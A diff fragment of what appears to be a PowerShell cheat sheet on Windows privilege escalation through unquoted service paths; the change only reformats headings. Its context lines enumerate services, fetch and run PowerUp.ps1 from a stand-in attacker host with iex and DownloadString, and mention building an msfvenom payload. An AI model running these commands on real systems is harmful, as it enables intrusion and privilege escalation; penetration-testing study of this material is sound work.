@@ -22,7 +22,9 @@
 #   W             Write-only access
 
 ######################################################################
-#Enumeration.
+
+#### Enumeration ####
+
 #List Name,State,Paths of services.
 Get-CimInstance -ClassName win32_service | Select Name,State,PathName 
 
@@ -45,7 +47,8 @@ iex (New-Object Net.WebClient).DownloadString('http://IP_ATTACKER/PowerUp.ps1')
 Invoke-AllChecks
 
 ###########################################################################
-#Leading the attack.
+
+#### Leading the attack ####
 
 #Once we find a unquoted service path that give us a satisfactory location to write pur payload and know how to trigger the start/restart of the service we can make our payload with msfvenom:
 
